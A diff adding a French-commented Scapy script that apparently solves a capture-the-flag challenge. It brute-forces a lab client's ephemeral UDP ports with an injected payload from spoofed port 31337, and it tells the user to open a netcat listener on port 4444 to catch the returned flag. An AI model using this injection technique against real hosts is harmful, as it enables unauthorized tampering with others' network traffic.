@@ -1,0 +1,18 @@
+from scapy.all import IP, UDP, Raw, send
+
+payload = b"FLAG:10.0.0.1:4444"
+
+# Au lieu de scanner les 65535 ports (ce qui est très lent avec Scapy),
+# on cible uniquement la plage des "ports éphémères" de Linux (32768 à 60999).
+# C'est dans cette plage que le système d'exploitation du client (10.0.0.2) 
+# a pioché un port aléatoire lors de l'exécution de son code.
+paquet = IP(dst="10.0.0.2") / UDP(sport=31337, dport=(32768, 61000)) / Raw(load=payload)
+
+print("[*] Début du brute-force UDP avec Scapy (cela peut prendre quelques secondes)...")
+
+# verbose=0 est crucial ici, sinon Scapy va imprimer "Sent 1 packets..." des milliers de fois
+send(paquet, verbose=0)
+
+print("[+] Attaque terminée ! Vérifiez votre processus netcat en arrière-plan.")
+
+# (N'oubliez pas de lancer nc -lu -p 4444 & dans votre terminal avant de l'exécuter pour attraper le drapeau !)
